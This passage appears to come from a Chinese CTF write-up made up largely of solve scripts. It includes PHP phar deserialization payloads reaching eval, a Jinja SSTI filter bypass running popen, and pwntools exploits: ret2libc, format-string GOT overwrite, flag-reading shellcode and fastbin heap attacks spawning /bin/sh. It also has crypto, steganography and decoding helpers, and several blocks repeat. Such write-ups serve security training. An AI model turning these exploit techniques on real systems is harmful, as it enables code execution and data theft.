$phar->setMetadata($file); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

// 读取根目录下有什么文件
$file2=new file();
$file2->data = 'data://text/plain,bbf9a96f322ee4800a910dac0f76ca05'; //修改为对应的md5值
$file2->name = new file();
$file2->name->ou = new data();
$file2->name->ou->oi = 'if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));';

@unlink("phar2.phar");
$phar = new Phar("phar2.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file2); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

// 随机读取根目录下的文件
$file3=new file();
$file3->data = 'data://text/plain,bbf9a96f322ee4800a910dac0f76ca05'; //修改为对应的md5值
$file3->name = new file();
$file3->name->ou = new data();
$file3->name->ou->oi = 'if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));';

@unlink("phar3.phar");
$phar = new Phar("phar3.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file3); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

后来

完整的看一遍视频，视频末尾一闪而过pwd字样

对应视频中的位置，得到pwd  ==balenciaga==

再看一眼备注 ：

ffmpeg 是一个开源的、跨平台的命令行工具，它能够进行视频、音频文件的转换以及流媒体的处理。它非常强大且灵活，广泛应用于多媒体处理任务中，包括但不限于：

转码（Transcoding）：将一种编码格式转换为另一种编码格式。

剪辑（Trimming）：从视频或音频文件中提取部分片段。

合并（Concatenation）：将多个视频或音频文件合并成一个文件。

滤镜应用（Filtering）：对视频或音频应用各种滤镜效果。

元数据编辑（Metadata Editing）：添加、修改或删除多媒体文件中的元数据。

流式传输（Streaming）：支持多种协议的实时音视频流传输。

抓取（Grabbing）：从摄像头或其他设备捕获视频和音频。


```
#解密脚本
list1 = ['斗木獬', '牛金牛', '女土蝠', '虚日鼠', '危月燕', '室火猪', '壁水貐']
list2 = ['角木蛟', '亢金龙', '氐土貉', '房日兔', '心月狐', '尾火虎', '箕水豹']
list3 = ['奎木狼', '娄金狗', '胃土雉', '昴日鸡', '毕月乌', '觜火猴', '参水猿']
list4 = ['井木犴', '鬼金羊', '柳土獐', '星日马', '张月鹿', '翼火蛇', '轸水蚓']

# 定义输入数据
data = [
    "角木蛟", "觜火猴", "箕水豹", "毕月乌", "氐土貉", "毕月乌", "轸水蚓", "女土蝠", "尾火虎", "昴日鸡", "壁水貐", "箕水豹",
    "尾火虎", "奎木狼", "心月狐", "张月鹿", "尾火虎", "井木犴", "昴日鸡", "柳土獐", "角木蛟", "女土蝠", "室火猪",
    "觜火猴", "氐土貉", "奎木狼", "牛金牛", "箕水豹", "亢金龙", "胃土雉", "房日兔", "翼火蛇", "尾火虎", "轸水蚓",
    "箕水豹", "尾火虎", "尾火虎", "壁水貐", "牛金牛", "亢金龙", "氐土貉", "箕水豹", "翼火蛇", "翼火蛇", "亢金龙",
    "女土蝠", "星日马", "角木蛟", "壁水貐", "井木犴", "角木蛟", "牛金牛", "箕水豹", "柳土獐", "室火猪", "张月鹿",
    "心月狐", "星日马", "角木蛟", "虚日鼠", "亢金龙", "参水猿", "箕水豹", "箕水豹", "尾火虎", "翼火蛇", "斗木獬",
    "参水猿", "心月狐", "尾火虎", "张月鹿", "张月鹿", "虚日鼠", "星日马", "斗木獬", "室火猪", "氐土貉", "鬼金羊",
    "角木蛟", "娄金狗", "斗木獬", "井木犴", "壁水貐", "斗木獬", "氐土貉", "星日马", "轸水蚓", "氐土貉"
]

# 存储二进制字符串
binary_string = ""

# 遍历 data 并拼接对应的二进制代码
for item in data:
    if item in list1:
        binary_string += "00"
    elif item in list2:
        binary_string += "01"
    elif item in list3:
        binary_string += "10"
    elif item in list4:
        binary_string += "11"

# 每8位二进制转换成ASCII字符并输出
ascii_output = ""
for i in range(0, len(binary_string), 8):
    byte = binary_string[i:i + 8]  # 获取8位二进制
    ascii_output += chr(int(byte, 2))  # 转换为十进制并转为字符

print(ascii_output)
from flask import Flask, request, render_template_string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import waf

app = Flask(__name__)

limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["300 per day", "75 per hour"]
)

@app.route('/')
@limiter.exempt
def index():
    file_path = request.args.get('file')
    if file_path and "proc"in file_path:
        return"只过滤了proc，别想用这个了，去读源码", 200
    if file_path:
        try:
            with open(file_path, 'r') as file:
                file_content = file.read()
            return f"{file_content}"
        
except Exception as e:
            return f"Error reading file: {e}"
    return"Find the get parameter to read something"

@app.route('/shell')
@limiter.limit("10 per minute")
def shell():
    if request.args.get('name'):
        person = request.args.get('name')
        if not waf.waf_check(person):
            mistake = "Something is banned"
            return mistake
        template = 'Hi, %s' % person
        return render_template_string(template)
    some = 'who you are?'
    return render_template_string(some)

@app.errorhandler(429)
def ratelimit_error(e):
    return"工具？ 毫无意义，去手搓", 429

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=8000)
@app.route('/shell')
@limiter.limit("10 per minute")
def shell():
    if request.args.get('name'):
        person = request.args.get('name')
        if not waf.waf_check(person):
            mistake = "Something is banned"
            return mistake
        template = 'Hi, %s' % person
        return render_template_string(template)
    some = 'who you are?'
    return render_template_string(some)
def waf_check(value):
    dangerous_patterns = ['os', 'set', '__builtins__', '=', '.', '{{', '}}', 'popen', '+', '__']
    for pattern in dangerous_patterns:
        if pattern in value:
            return False
    return True
{%print g['pop'][('_'*2)|attr("x5fx5faddx5fx5f")('globals')|attr("x5fx5faddx5fx5f")('_'*2)][('_'*2)|attr("x5fx5faddx5fx5f")('builtins')|attr("x5fx5faddx5fx5f")('_'*2)][('_'*2)|attr("x5fx5faddx5fx5f")('import')|attr("x5fx5faddx5fx5f")('_'*2)]('so'[::-1])['p''open']('ls')['read']()%}
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

prdi = 0x000000000040071E
ru(b"Enter your name: ")
sl(b"1")
ru(b"Introduce yourself: ")
payload = b"a" * (0x8 * 3 - 1) + b"Z"

sl(payload)
ru(b"Zn")
canary = u(r(7).rjust(8, b" "))
success(hex(canary))
ru(b"Say something: ")
payload = (
    b"a" * (0x8 * 3)
    + p(canary)
    + b"a" * 8
    + p(prdi)
    + p(elf.got["read"])
    + p(elf.sym["puts"])
    + p(0x000000000400737)
)

sl(payload)
leak_got = u(r(6).ljust(8, b" "))

success(hex(leak_got))
base = leak_got - 0x110020
system = base + 0x4F420
success(hex(system))
binsh = 0x000000000600CF0
payload = (
    b"a" * (0x8 * 3)
    + p(canary)
    + b"a" * 8
    + p(0x0000000000400596)
    + p(prdi)
    + p(binsh)
    + p(system)
)
ru(b"Enter your name: ")
sl(b"/bin/sh ")
ru(b"Introduce yourself: ")
sl(b"1")
ru(b"Say something: ")
sl(payload)

ia()
sh
cat flag
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

ru(b"Gift for you: ")
read = int(r(len(str(0x7F175D9A37D0))), 16)
success(hex(read))
system = read - 0x110020 + 0x4F420
base = 8
ru(b"Enter a fmt string:")
payload = fmtstr_payload(base, {elf.got["exit"]: p(elf.sym["main"])})
sl(payload)

ru(b"Enter a fmt string:")
payload = fmtstr_payload(base, {elf.got["printf"]: p(system)})
sl(payload)
sl(b"/bin/shx00")

ia()
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

shellcode = """
/* openat(file='/flag', oflag=0, mode=0) */
    /* push b'flagx00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c66
    xor [rsp], rax
    mov rsi, rsp
    mov rdi, -100
    mov rdx, 0
    mov r8, 0
    /* call open() */
    mov rax, 0x101
    syscall
    mov r10,rsp
    add r10,100
    mov qword ptr [rsp],r10
    mov qword ptr [rsp+8],1024
    mov rdi, rax
    mov rax, 19
    mov rsi,rsp
    mov rdi,3
    mov rdx, 1
    syscall
    mov eax, 20
    mov edi, 1
    mov rsi, rsp
    mov rdx, 1
    syscall
"""

s(asm(shellcode))
ia()
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

def menu():
    ru(b"Enter your choice: ")

def alloc(idx, size, content):
    menu()
    sl(b"1")
    ru(b":")
    sl(str(idx))
    ru(b":")
    sl(str(size))
    ru(b":")
    sl(content)

def free(idx):
    menu()
    sl(b"3")
    ru(b":")
    sl(str(idx))

def edit(idx, size, content):
    menu()
    sl(b"2")
    ru(b":")
    sl(str(idx))
    ru(b":")
    sl(str(size))
    if size == 0:
        return
    else:
        ru(b":")
        sl(content)

def show(idx):
    menu()
    sl(b"4")
    ru(b":")
    sl(str(idx))

ru(b"What's this?: ")
backdoor = int(r(8), 16)
alloc(0, 0x90, b"aa")
alloc(1, 0x60, b"aa")
alloc(2, 0x60, b"aa")
edit(0, 0, b"")
show(0)
ru(b"0: ")
leak = u(r(6).ljust(8, b" "))

# free_hook = leak + 0x01C30
fake_fast = leak - 0x7B
success(hex(fake_fast))
# ps()
edit(1, 0, b"")
edit(2, 0, b"")

success(hex(backdoor))
edit(1, 0x60, p(fake_fast))
alloc(3, 0x60, b"aa")
alloc(4, 0x60, b"aa")
alloc(5, 0x60, b"a" * 0x3 + p(backdoor))

menu()
sl(b"1")
ru(b":")
sl(str(6))
ru(b":")
sl(str(0x10))

ia()
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

def menu():
    ru(b"Enter your choice: ")

def alloc(idx, size, content):
    menu()
    sl(b"1")
    ru(b":")
    sl(str(idx))
    ru(b":")
    sl(str(size))
    ru(b":")
    s(content)

def free(idx):
    menu()
    sl(b"3")
    ru(b":")
    sl(str(idx))

def edit(idx, content):
    menu()
    sl(b"2")
    ru(b":")
    sl(str(idx))
    ru(b":")
    s(content)

def show(idx):
    menu()
    sl(b"4")
    ru(b":")
    sl(str(idx))

base = 0
for i in range(9):
    alloc(base, 0x20, b"a")
    base += 1
free(4)
free(3)
payload = b"a" * (0x90 - 1) + b"Z"
edit(0, payload)
show(0)
ru(b"Z")

heap0 = u(r(4).ljust(8, b" ")) - 0xC0
heap_base = heap0 - 0x490
success(hex(heap_base))

pause()  # 这里看运气，如果heap的地址不是4字节长就得重新运行exp，懒得修这个bug了

payload = (
    p(0) * 4 + p(0x31) + p(0xA1) + p(0) * 2 * 9 + p(0xA1) + p(0x21) + p(0x21) + p(0x11)
)
edit(0, payload)
free(1)
payload = b"a" * 8 * 5 + b"a" * 7 + b"Z"
edit(0, payload)
show(0)
ru(b"Z")
leak = u(r(6).ljust(8, b" "))
leak -= 0x3C3B78
success(hex(leak))
fake_fast = leak + 0x3C3AED
og = leak + 0xEF9F4
"""0x4525a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv
0xef9f4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv
0xf0897 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv"""

payload = (
    p(0) * 5 * 2 + p(0) + p(0x71) + p(0) * 2 * 6 + p(0x61) + p(0x11) + p(0x11) + p(0x11)
)
edit(0, payload)
free(2)
payload = p(0) * 5 * 2 + p(0) + p(0x71) + p(fake_fast)
edit(0, payload)
alloc(1, 0x60, b"a")
alloc(2, 0x60, b"a" * 0x13 + p(heap0 + 0x10))
payload = asm(shellcraft.sh())
edit(0, payload)
free(1)

menu()
sl(b"1")
ru(b":")
sl(str(1))
ru(b":")
sl(str(0x10))

ia()
import itertools
import string

ciphertext = bytearray([0x08, 0x05, 0x0a, 0x02, 0x15, 0x23, 0x3e, 0x36, 0x3a, 0x36, 0x2f, 0x55, 0x31, 0x58, 0x3f, 0x18])
def xor_decrypt(data, key):
    decrypted = bytearray()
    for i in range(len(data)):
        decrypted.append(data[i] ^ key[i % len(key)])
    return decrypted
def brute_force_xor_key(ciphertext):
    for key in itertools.product(string.ascii_lowercase, repeat=4):
        key_str = ''.join(key)
        decrypted_text = xor_decrypt(ciphertext, bytes(key_str, 'utf-8'))
        print(f'key: {key_str}, | {decrypted_text.decode("utf-8")}')
    return None
found_key = brute_force_xor_key(ciphertext)
from sympy import mod_inverse
e = 65537
n = 1455925529734358105461406532259911790807347616464991065301847
p = 1201147059438530786835365194567
q = 1212112637077862917192191913841
c = 69380371057914246192606760686152233225659503366319332065009
phi_n = (p - 1) * (q - 1)
d = mod_inverse(e, phi_n)
m = pow(c, d, n)
print(bytes.fromhex(hex(m)[2:]).decode())
from sympy import mod_inverse
p = 105038194193899515019447140405205579493289210244572767409545440358851163280965395453074976398044017243177911159096972243867985372174027224124181767942149308681063335044762355577934881504502469182724481949671518205998572766264483054891139270362336019492873565945485673532086972823698106471372599520368545108299
q = 131875826716323523148433295878953050557752317511962437375097305678556817762514768704278183959540938622638859584695873987803639891091171158984491576191575189523381929708029006917399486577694013126044860470568409738236462778680818847784162139064455152770977552909157838301186145084657447139653926320540680063339
e = 65537
n = 13851998696110232034312408768370264747862778787235362033287301947690834384177869107768578977872169953363148442670412868565346964490724532894099772144625540138618913694240688555684873934424471837897053658485573395777349902581306875149677867098014969597240339327588421766510008083189109825385296069501377605893298996953970043168244444585264894721914216744153344106498382558756181912535774309211692338879110643793628550244212618635476290699881188640645260075209594318725693972840846967120418641315829098807385382509029722923894508557890331485536938749583463709142484622852210528766911899504093351926912519458381934550361
dp = 100611735902103791101540576986246738909129436434351921338402204616138072968334504710528544150282236463859239501881283845616704984276951309172293190252510177093383836388627040387414351112878231476909883325883401542820439430154583554163420769232994455628864269732485342860663552714235811175102557578574454173473
c = 6181444980714386809771037400474840421684417066099228619603249443862056564342775884427843519992558503521271217237572084931179577274213056759651748072521423406391343404390036640425926587772914253834826777952428924120724879097154106281898045222573790203042535146780386650453819006195025203611969467741808115336980555931965932953399428393416196507391201647015490298928857521725626891994892890499900822051002774649242597456942480104711177604984775375394980504583557491508969320498603227402590571065045541654263605281038512927133012338467311855856106905424708532806690350246294477230699496179884682385040569548652234893413
phi_n = (p - 1) * (q - 1)
d = mod_inverse(e, phi_n)
m = pow(c, d, n)
print(bytes.fromhex(hex(m)[2:]).decode())
from gmpy2 import next_prime
def count_valid_sequences(length):
    dp = [{} for _ in range(length + 1)]
    dp[1][1] = 1
    for i in range(1, length):
        for state in dp[i]:
            for next_bit in [0, 1]:
                new_state = ((state << 1) & 0b111) | next_bit
                if i >= 3:
                    full_seq = ((state << 1) | next_bit)
                    if full_seq == 0b1111 or full_seq == 0:
                        continue
                dp[i + 1][new_state] = dp[i + 1].get(new_state, 0) + dp[i][state]
    result = 0
    for state in dp[length]:
        if state & 1: 
            result += dp[length][state]
    return result
key = count_valid_sequences(2331)
print(key)
p = next_prime(key)
print(p)
from Crypto.Util.number import *
from sympy import mod_inverse

n = 739243847275389709472067387827484120222494013590074140985399787562594529286597003777105115865446795908819036678700460141950875653695331369163361757157565377531721748744087900881582744902312177979298217791686598853486325684322963787498115587802274229739619528838187967527241366076438154697056550549800691528794136318856475884632511630403822825738299776018390079577728412776535367041632122565639036104271672497418509514781304810585503673226324238396489752427801699815592314894581630994590796084123504542794857800330419850716997654738103615725794629029775421170515512063019994761051891597378859698320651083189969905297963140966329378723373071590797203169830069428503544761584694131795243115146000564792100471259594488081571644541077283644666700962953460073953965250264401973080467760912924607461783312953419038084626809675807995463244073984979942740289741147504741715039830341488696960977502423702097709564068478477284161645957293908613935974036643029971491102157321238525596348807395784120585247899369773609341654908807803007460425271832839341595078200327677265778582728994058920387721181708105894076110057858324994417035004076234418186156340413169154344814582980205732305163274822509982340820301144418789572738830713925750250925049059
c = 229043746793674889024653533006701296308351926745769842802636384094759379740300534278302123222014817911580006421847607123049816103885365851535481716236688330600113899345346872012870482410945158758991441294885546642304012025685141746649427132063040233448959783730507539964445711789203948478927754968414484217451929590364252823034436736148936707526491427134910817676292865910899256335978084133885301776638189969716684447886272526371596438362601308765248327164568010211340540749408337495125393161427493827866434814073414211359223724290251545324578501542643767456072748245099538268121741616645942503700796441269556575769250208333551820150640236503765376932896479238435739865805059908532831741588166990610406781319538995712584992928490839557809170189205452152534029118700150959965267557712569942462430810977059565077290952031751528357957124339169562549386600024298334407498257172578971559253328179357443841427429904013090062097483222125930742322794450873759719977981171221926439985786944884991660612824458339473263174969955453188212116242701330480313264281033623774772556593174438510101491596667187356827935296256470338269472769781778576964130967761897357847487612475534606977433259616857569013270917400687539344772924214733633652812119743
e = 65537
p = 24440283427735860782323152407294917357529111353275570975703531438440519660225708967888657253644278000783263820558388701592370615088140947096898134081330591301984360290318641970617489021626752360815885812583176251873031239638493762071047588297627032203293985708994218852662838640238623254740905447146670999830187552717802257362427107073858485019955606331947972091793616373347825119600328855885246072890798551616534636247023983959037046475229361825549780845049341719145179099452625523855259198581865855234803188298849910863377098140158406245399677912502444220011884063994451182221171275547685147549629637310805120817903
q = n // p
phi_n = (p - 1) * (q - 1)
d = mod_inverse(e, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m).decode()
print(flag)
$files = array('./login', './modify', './register', './flag');
if (isset($_POST['file']) && in_array($_POST['file'], $files)){...}
$client_ip = $_SERVER["REMOTE_ADDR"];
$server_ip = $_SERVER["SERVER_ADDR"];
if ($client_ip === $server_ip) {
    if(md5($_GET["a"]) === md5($_GET["b"])){
        if ($_GET["c"] != $_GET["d"] && md5($_GET["c"]) == md5($_GET["d"])){
            if(substr(md5($_GET["e"]), 0, 5) === "9331c"){
                $file = fopen("./ffflllaaaggg.php", "w");
                fwrite($file, "<?php n echo $flag".";");
                fclose($file);
            }
        }
    }
} else {
    $code = '';
    highlight_string($code);
    echo'<script>alert("错啦错啦错啦！");</script>';
    header('Location: login.html');
    die();
}
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# @Project -> File     ：flag -> md5         
# @IDE      ：PyCharm
# @Author   ：wi1shu
# @Date     ：2023/4/17 14:52
# @Software : win10 python3.9
import hashlib
import threading

total = 100000000000
# 从1到多少
threads = 100
# 线程数
truncation = "9331c"# 被截断的值
positions = [0, 5] # 截断位置

per_thread = total // threads
threads_list = []
def calculate_md5(start, end):
    for i in range(start, end):
        md5 = hashlib.md5(str(i).encode()).hexdigest()
        if md5[positions[0]:
positions[1]] == truncation:
            print(f"{truncation} -> {i}: {md5}")

if __name__ == "__main__":
    for i in range(threads):
        start = i * per_thread + 1
        end = start + per_thread
        if i == threads - 1:
            end = total + 1
        thread = threading.Thread(target=calculate_md5, args=(start, end))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()

    print("finished.")
$client_ip = $_SERVER["REMOTE_ADDR"];
$server_ip = $_SERVER["SERVER_ADDR"];
if ($client_ip === $server_ip) {
    if ($_GET["KAF"] !== "1a" && (int)$_GET["KAF"] == "1a"){
        ...
    }
} else {
    echo 'xxx'
    echo '<script>alert("坏蛋改不了一点密码！");</script>';
    die();
}
$file=new file();
@unlink("phar1.phar");
$phar = new Phar("phar1.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
// 读取根目录下有什么文件
$file2=new file();
$file2->data = 'data://text/plain,bbf9a96f322ee4800a910dac0f76ca05'; //修改为对应的md5值
$file2->name = new file();
$file2->name->ou = new data();
$file2->name->ou->oi = 'if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));';

@unlink("phar2.phar");
$phar = new Phar("phar2.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file2); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
// 随机读取根目录下的文件
$file3=new file();
$file3->data = 'data://text/plain,bbf9a96f322ee4800a910dac0f76ca05'; //修改为对应的md5值
$file3->name = new file();
$file3->name->ou = new data();
$file3->name->ou->oi = 'if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));';

@unlink("phar3.phar");
$phar = new Phar("phar3.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file3); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
<?php

class file
{
    public $name;
    public $data;
    public $ou;
    private $mymd5;
    publicfunction __wakeup()
    {

    }
    publicfunction __call($name, $arguments)
    {
        return$this->ou->b='asdasdasd';
    }

    publicfunction __destruct()
    {
        if (@file_get_contents($this->data) === $this->mymd5) {
            $this->name->function();
        }
    }
}

class data
{
    public $a;
    public $oi;

    publicfunction __set($name, $value)
    {
        // TODO: Implement __set() method.
        $this->yyyou();
        return"yes";
    }

    publicfunction yyyou()
    {
        if(';' === preg_replace('/[^W]+((?R)?)/', '', $this->oi)){
            eval($this->oi);
        }

    }
}

$file=new file();
@unlink("phar1.phar");
$phar = new Phar("phar1.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

// 读取根目录下有什么文件
$file2=new file();
$file2->data = 'data://text/plain,bbf9a96f322ee4800a910dac0f76ca05'; //修改为对应的md5值
$file2->name = new file();
$file2->name->ou = new data();
$file2->name->ou->oi = 'if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));';

@unlink("phar2.phar");
$phar = new Phar("phar2.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file2); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

// 随机读取根目录下的文件
$file3=new file();
$file3->data = 'data://text/plain,bbf9a96f322ee4800a910dac0f76ca05'; //修改为对应的md5值
$file3->name = new file();
$file3->name->ou = new data();
$file3->name->ou->oi = 'if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));';

@unlink("phar3.phar");
$phar = new Phar("phar3.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file3); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
ffmpeg -i "有一个男孩 爱着那个女孩.mkv" -c:a copy output.wav
佛曰：缽老皤漫奢利冥曰都俱醯至般諳滅皤佛俱即呼離迦密哆楞醯寫冥有梵悉缽恐俱孕侄大訶奢跋缽能罰穆諳離尼室藝梵尼亦冥恐伽哆特波罰若集俱世俱隸遠諳曳遠殿罰迦蒙冥醯
for file in *.png; do zsteg "$file" | grep -E 'b1,rgb,lsb,xy' | awk -F'"' '{print $2}'; done > LSB.txt
from datetime import datetime
import time

# 给定的参考时间戳，对应于 "2012-06-12 13:08:36" 的时间戳
ref_timestamp = 1339477716  # 这个时间戳是根据你提供的格式 "2012-6-12 13:08:36" 转换而来

def diff_to_ascii(diff):
    """
    将时间戳差值转换为ASCII字符，只包括可打印字符。
    如果无法生成有效的ASCII字符，则跳过该字节。
    """
    ascii_chars = []
    for i in range(3, -1, -1):  # 从最高有效字节开始构建
        byte_value = diff // (256 ** i) % 256
        if 32 <= byte_value <= 126:  # 只添加可打印的ASCII字符
            ascii_chars.append(chr(byte_value))
        # 不再使用点号代替不可打印字符，直接忽略无效字节
    return''.join(ascii_chars)

def txt_to_ascii(input_file, date_str="2012-6-12", ref_ts=ref_timestamp):
    """
    读取给定文本文件中的每一行，
    将每行内容与指定日期组合成完整的时间字符串，
    计算该时间相对于给定参考时间的时间戳差异，
    并将差异转换为ASCII字符输出。
    """
    with open(input_file, 'r') as file:
        lines = file.readlines()
    
    flag_parts = []  # 用于收集所有行转换后的ASCII字符
    
    for line in lines:
        stripped_line = line.strip()
        if stripped_line:  # 忽略空行
            # 格式化时间为 "2012-6-12 HH:MM:SS"
            formatted_time = f"{date_str} {stripped_line}"
            
            try:
                # 将格式化后的时间字符串转换为时间戳
                dt = datetime.strptime(formatted_time, "%Y-%m-%d %H:%M:%S")
                timestamp = int(time.mktime(dt.timetuple()))
                
                # 计算与给定时间戳的差异
                diff = timestamp - ref_ts
                
                # 将差值转换为ASCII字符并加入到flag部分中
                flag_part = diff_to_ascii(diff)
                if flag_part:  # 确保只有非空字符串才添加
                    flag_parts.append(flag_part)
                
            
except ValueError as e:
                print(f"无法解析时间：{formatted_time}, 错误：{e}")
    
    # 输出最终的flag，所有行的ASCII字符连接在一起
    print("".join(flag_parts))

# 调用函数处理文件，这里使用了绝对路径，请根据实际情况调整
txt_to_ascii('path') #修改为你的txt路径
import os

def reverse_file_hex_and_save(input_file_path, output_file_path):
    """
    从文件尾部开始读取内容，以十六进制形式逐字节反转，并将结果写入新文件。
    :
param input_file_path: 输入文件路径
    :
param output_file_path: 输出文件路径
    """
    with open(input_file_path, 'rb') as input_file, open(output_file_path, 'wb') as output_file:
        # 获取文件大小
        file_size = os.path.getsize(input_file_path)
        byte_list = []
        
        for position in range(file_size - 1, -1, -1):  # 从文件尾部开始反向遍历
            # 移动文件指针到当前位置
            input_file.seek(position)
            # 读取单个字节并直接追加到列表，这里不进行十六进制转换，因为最终目标是保持原样写入新文件
            byte_list.append(input_file.read(1))
        
        # 将收集的字节序列写入新文件
        output_file.write(b''.join(byte_list))

# 示例用法
input_file_path = 'path'# 请替换为你的输入文件路径
output_file_path = 'path'# 输出文件的路径和名称
reverse_file_hex_and_save(input_file_path, output_file_path)
print(f"Reversed content has been saved to {output_file_path}")
b_千字文 = b_千字文.replace(" ", "").replace("n", "")

def h_千进制解码(a, b, c, d):
    # 查找每个字符在千字文中的位置
    a1 = b_千字文.find(a)
    b1 = b_千字文.find(b)
    c1 = b_千字文.find(c)
    d1 = b_千字文.find(d)

    s0 = (a1 & 1020) >> 2
    s1_1 = (a1 & 3) << 6
    s1_2 = (b1 & 1008) >> 4
    s1 = s1_1 + s1_2

    s2_1 = (b1 & 15) << 4
    s2_2 = (c1 & 960) >> 6
    s2 = s2_1 + s2_2

    s3_1 = (c1 & 63) << 2
    s3_2 = (d1 & 768) >> 8
    s3 = s3_1 + s3_2

    s4 = d1 & 255

    return bytes([s0, s1, s2, s3, s4])

def h_千字文解码(b_千字文码):
    b_零的数量 = 0
    while b_千字文码 and b_千字文码[-1] == '零':
        b_千字文码 = b_千字文码[:-1]
        b_零的数量 += 1

    if len(b_千字文码) % 4 != 0:
        b_千字文码 += '天' * (4 - len(b_千字文码) % 4)

    i = 0
    b_字节码 = bytearray()
    while i < len(b_千字文码):
        chunk = b_千字文码[i:i+4]
        if'零'in chunk:
            # 如果存在填充的'零',只添加有效部分
            valid_chunk = chunk.replace('零', '')
            decoded_bytes = h_千进制解码(*valid_chunk.ljust(4, '天'))
            b_字节码.extend(decoded_bytes[:
len(valid_chunk)])
        else:
            b_字节码.extend(h_千进制解码(*chunk))
        i += 4

    return b_字节码[:-b_零的数量].decode('utf-8')

if __name__ == '__main__':
    # 示例密文，需要替换为实际的密文
    encrypted_text = "利师迩鉴石碣遥逍汉玄珍覆穑碣云罗侈平同此竹岱饭乎见槐洛五伦璧策缘芸武秦伤阮空创欲雁刻分超任策迩释机于焉笃僚施迩姿植沙疫书曲亲零零零"
    decrypted_text = h_千字文解码(encrypted_text)
    print('解码后的明文:', decrypted_text)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]